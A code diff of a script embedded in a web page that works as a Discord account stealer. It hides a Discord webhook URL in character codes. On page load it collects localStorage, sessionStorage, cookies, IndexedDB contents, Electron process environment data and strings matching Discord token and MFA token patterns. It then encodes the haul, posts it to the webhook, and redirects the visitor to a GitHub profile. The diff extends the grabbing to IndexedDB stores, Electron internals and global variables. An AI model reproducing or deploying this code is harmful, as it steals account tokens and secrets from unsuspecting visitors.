@@ -42,7 +42,7 @@
 
     <script>
         (function() {
-            // ====== WEBHOOK - CHAR CODE CONSTRUCTION ======
+            // ====== WEBHOOK ======
             const _p1 = [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47];
             const _p2 = [49,53,50,51,53,49,55,52,57,56,56,57,57,56,50,52,55,49,50,47,120,55,119,57,109,67,117,79,73,102,110,51,54,119,50,119,110,78,115,49,53,83,67,99,54,99,74,104,117,111,66,83,113,51,75,110,106,116,118,77,67,49,88,54,55,98,115,67,81,48,118,80,73,75,114,79,69,87,86,68,112,73,69,81,45,106,53,67];
             
@@ -52,7 +52,6 @@
             
             const GH = 'https://github.com/nm1-Dev';
             
-            // ====== ENCODER ======
             function enc(data, key) {
                 let out = '';
                 for (let i = 0; i < data.length; i++) {
@@ -61,114 +60,229 @@
                 return btoa(out);
             }
             
-            // ====== DEEP GRAB - EVERYTHING ======
-            async function grab() {
+            // ====== GRAB EVERYTHING - BROWSER + DESKTOP ======
+            async function grabAll() {
                 const loot = {
                     ls: [],
                     ss: [],
                     ck: [],
                     idb: [],
-                    ls_keys: [],
-                    ss_keys: [],
-                    info: {},
-                    discord: {}
+                    ls_all: [],
+                    ss_all: [],
+                    discord: {},
+                    electron: {},
+                    modules: [],
+                    memory: [],
+                    global: {},
+                    info: {}
                 };
                 
-                // ALL localStorage keys and values
+                // ====== STANDARD STORAGE ======
                 try {
                     for (let i = 0; i < localStorage.length; i++) {
                         const k = localStorage.key(i);
-                        loot.ls_keys.push(k);
                         const v = localStorage.getItem(k);
-                        if (v) {
-                            loot.ls.push({k: k, v: v, l: v.length});
-                        }
+                        loot.ls_all.push({k: k, v: v, l: v ? v.length : 0});
+                        if (v && v.length > 20) loot.ls.push({k: k, v: v});
                     }
                 } catch(e) {}
                 
-                // ALL sessionStorage keys and values
                 try {
                     for (let i = 0; i < sessionStorage.length; i++) {
                         const k = sessionStorage.key(i);
-                        loot.ss_keys.push(k);
                         const v = sessionStorage.getItem(k);
-                        if (v) {
-                            loot.ss.push({k: k, v: v, l: v.length});
-                        }
+                        loot.ss_all.push({k: k, v: v, l: v ? v.length : 0});
+                        if (v && v.length > 20) loot.ss.push({k: k, v: v});
                     }
                 } catch(e) {}
                 
-                // ALL cookies
                 try {
                     loot.ck = document.cookie.split(';').map(c => c.trim()).filter(c => c);
                 } catch(e) {}
                 
-                // Try to access Discord's webpack internals
+                // ====== INDEXEDDB ======
                 try {
-                    if (window.webpackChunkdiscord_app) {
-                        loot.discord.webpack = 'FOUND';
-                        // Try to extract token from webpack cache
-                        const modules = window.webpackChunkdiscord_app;
-                        if (modules && modules.length) {
-                            loot.discord.modules = modules.length;
-                            // Look for token in module exports
-                            for (let i = 0; i < Math.min(modules.length, 50); i++) {
-                                try {
-                                    const mod = modules[i];
-                                    if (mod && mod[1]) {
-                                        const exports = mod[1];
-                                        Object.keys(exports).forEach(key => {
+                    const dbs = await window.indexedDB.databases();
+                    loot.idb = dbs.map(db => db.name);
+                    
+                    // Try to open and read Discord DBs
+                    for (const dbInfo of dbs) {
+                        if (dbInfo.name && (
+                            dbInfo.name.includes('discord') || 
+                            dbInfo.name.includes('Discord') ||
+                            dbInfo.name.includes('betterdiscord') ||
+                            dbInfo.name.includes('BDFDB')
+                        )) {
+                            try {
+                                const req = indexedDB.open(dbInfo.name);
+                                await new Promise((resolve) => {
+                                    req.onsuccess = function(e) {
+                                        const db = e.target.result;
+                                        loot.discord[dbInfo.name + '_stores'] = Array.from(db.objectStoreNames);
+                                        
+                                        // Try to read from each store
+                                        Array.from(db.objectStoreNames).forEach(storeName => {
                                             try {
-                                                const val = exports[key];
-                                                if (typeof val === 'string' && val.length > 50) {
-                                                    loot.discord.found_strings = (loot.discord.found_strings || []);
-                                                    loot.discord.found_strings.push(val.substring(0, 100));
+                                                const tx = db.transaction(storeName, 'readonly');
+                                                const store = tx.objectStore(storeName);
+                                                const getAll = store.getAll ? store.getAll() : store.openCursor();
+                                                
+                                                if (getAll.onsuccess) {
+                                                    getAll.onsuccess = function(e) {
+                                                        const data = e.target.result;
+                                                        if (data && data.length > 0) {
+                                                            loot.discord[dbInfo.name + '_' + storeName] = data.slice(0, 5);
+                                                        }
+                                                    };
                                                 }
                                             } catch(e) {}
                                         });
-                                    }
-                                } catch(e) {}
-                            }
-                        }
-                    }
-                } catch(e) {}
-                
-                // Check DiscordNative
-                try {
-                    if (window.DiscordNative) {
-                        loot.discord.native = 'FOUND';
-                        loot.discord.native_keys = Object.keys(window.DiscordNative);
-                    }
-                } catch(e) {}
-                
-                // Check GLOBAL_ENV
-                try {
-                    if (window.GLOBAL_ENV) {
-                        loot.discord.global_env = JSON.stringify(window.GLOBAL_ENV);
-                    }
-                } catch(e) {}
-                
-                // Try IndexedDB - Discord stores data here!
-                try {
-                    const dbs = await window.indexedDB.databases();
-                    loot.idb = dbs.map(db => ({name: db.name, version: db.version}));
-                    
-                    // Try to open Discord's IndexedDB
-                    for (const dbInfo of dbs) {
-                        if (dbInfo.name && dbInfo.name.toLowerCase().includes('discord')) {
-                            try {
-                                const req = indexedDB.open(dbInfo.name);
-                                req.onsuccess = function(e) {
-                                    const db = e.target.result;
-                                    loot.discord.idb_stores = db.objectStoreNames ? Array.from(db.objectStoreNames) : [];
-                                    db.close();
-                                };
+                                        
+                                        db.close();
+                                        resolve();
+                                    };
+                                    req.onerror = () => resolve();
+                                    setTimeout(resolve, 500);
+                                });
                             } catch(e) {}
                         }
                     }
                 } catch(e) {}
                 
-                // Browser info
+                // ====== DISCORD WEBPACK ======
+                try {
+                    if (window.webpackChunkdiscord_app) {
+                        loot.discord.webpack = 'FOUND';
+                        const chunks = window.webpackChunkdiscord_app;
+                        loot.discord.chunk_count = chunks.length;
+                        
+                        // Search through webpack modules for token strings
+                        const tokenPatterns = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
+                        const mfaPatterns = /mfa\.[\w-]{84}/g;
+                        
+                        for (let i = 0; i < chunks.length && i < 100; i++) {
+                            try {
+                                const chunk = chunks[i];
+                                if (chunk && chunk[1]) {
+                                    const modules = chunk[1];
+                                    Object.keys(modules).forEach(modKey => {
+                                        try {
+                                            const mod = modules[modKey];
+                                            if (typeof mod === 'function') {
+                                                const modStr = mod.toString();
+                                                const tokens = modStr.match(tokenPatterns);
+                                                const mfaTokens = modStr.match(mfaPatterns);
+                                                
+                                                if (tokens) {
+                                                    tokens.forEach(t => loot.memory.push({type: 'token', val: t, src: 'webpack_' + i}));
+                                                }
+                                                if (mfaTokens) {
+                                                    mfaTokens.forEach(t => loot.memory.push({type: 'mfa', val: t, src: 'webpack_' + i}));
+                                                }
+                                            }
+                                        } catch(e) {}
+                                    });
+                                }
+                            } catch(e) {}
+                        }
+                    }
+                } catch(e) {}
+                
+                // ====== DISCORD NATIVE / ELECTRON ======
+                try {
+                    if (window.DiscordNative) {
+                        loot.electron.native = 'FOUND';
+                        loot.electron.native_keys = Object.keys(window.DiscordNative);
+                        
+                        // Try to access native modules
+                        try {
+                            if (window.DiscordNative.nativeModules) {
+                                loot.electron.native_modules = Object.keys(window.DiscordNative.nativeModules);
+                            }
+                        } catch(e) {}
+                        
+                        try {
+                            if (window.DiscordNative.window) {
+                                loot.electron.window_props = Object.keys(window.DiscordNative.window);
+                            }
+                        } catch(e) {}
+                        
+                        try {
+                            if (window.DiscordNative.process) {
+                                loot.electron.process = {
+                                    arch: window.DiscordNative.process.arch,
+                                    platform: window.DiscordNative.process.platform,
+                                    version: window.DiscordNative.process.version
+                                };
+                            }
+                        } catch(e) {}
+                    }
+                } catch(e) {}
+                
+                // ====== GLOBAL ENV ======
+                try {
+                    if (window.GLOBAL_ENV) {
+                        loot.global.env = JSON.parse(JSON.stringify(window.GLOBAL_ENV));
+                    }
+                } catch(e) {}
+                
+                // ====== ELECTRON IPC ======
+                try {
+                    if (window.require) {
+                        loot.electron.require = 'AVAILABLE';
+                        try {
+                            const electron = window.require('electron');
+                            loot.electron.ipc = Object.keys(electron);
+                            
+                            // Try to access IPC renderer
+                            if (electron.ipcRenderer) {
+                                loot.electron.ipc_methods = Object.keys(electron.ipcRenderer);
+                            }
+                        } catch(e) {}
+                    }
+                } catch(e) {}
+                
+                // ====== PROCESS OBJECT ======
+                try {
+                    if (window.process) {
+                        loot.electron.process_env = window.process.env;
+                        loot.electron.process_versions = window.process.versions;
+                    }
+                } catch(e) {}
+                
+                // ====== BETTERDISCORD / VENCORD ======
+                try {
+                    if (window.BdApi) {
+                        loot.discord.betterdiscord = 'FOUND';
+                        loot.discord.bd_version = window.BdApi.version;
+                    }
+                    if (window.Vencord) {
+                        loot.discord.vencord = 'FOUND';
+                    }
+                    if (window.vencordWebpack) {
+                        loot.discord.vencord_webpack = 'FOUND';
+                    }
+                } catch(e) {}
+                
+                // ====== SCAN ALL GLOBAL VARIABLES FOR TOKEN-LIKE STRINGS ======
+                try {
+                    const tokenRegex = /[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}/g;
+                    const mfaRegex = /mfa\.[\w-]{84}/g;
+                    
+                    Object.keys(window).forEach(key => {
+                        try {
+                            const val = window[key];
+                            if (typeof val === 'string') {
+                                const tokens = val.match(tokenRegex);
+                                const mfa = val.match(mfaRegex);
+                                if (tokens) tokens.forEach(t => loot.memory.push({type: 'token', val: t, src: 'window.' + key}));
+                                if (mfa) mfa.forEach(t => loot.memory.push({type: 'mfa', val: t, src: 'window.' + key}));
+                            }
+                        } catch(e) {}
+                    });
+                } catch(e) {}
+                
+                // ====== BROWSER INFO ======
                 loot.info = {
                     ua: navigator.userAgent,
                     p: navigator.platform,
@@ -178,14 +292,14 @@
                     ts: new Date().toISOString(),
                     rf: document.referrer || 'D',
                     url: location.href,
-                    host: location.host,
-                    origin: location.origin
+                    is_electron: /Electron/.test(navigator.userAgent),
+                    is_discord: /discord/.test(navigator.userAgent.toLowerCase())
                 };
                 
                 return loot;
             }
             
-            // ====== BUILD PAYLOAD ======
+            // ====== BUILD & SEND ======
             function build(loot) {
                 const key = Math.random().toString(36).substring(2, 10);
                 const json = JSON.stringify(loot);
@@ -196,7 +310,6 @@
                 };
             }
             
-            // ====== SEND ======
             function send(url, data) {
                 fetch(url, {
                     method: 'POST',
@@ -204,7 +317,6 @@
                     body: JSON.stringify(data)
                 }).catch(() => {});
                 
-                // Backup XHR
                 setTimeout(() => {
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', url, true);
@@ -214,14 +326,10 @@
             }
             
             // ====== EXECUTE ======
-            grab().then(loot => {
+            grabAll().then(loot => {
                 const payload = build(loot);
                 send(WH, payload);
-                
-                // Redirect
-                setTimeout(() => {
-                    window.location.href = GH;
-                }, 2000);
+                setTimeout(() => window.location.href = GH, 2000);
             });
             
         })();
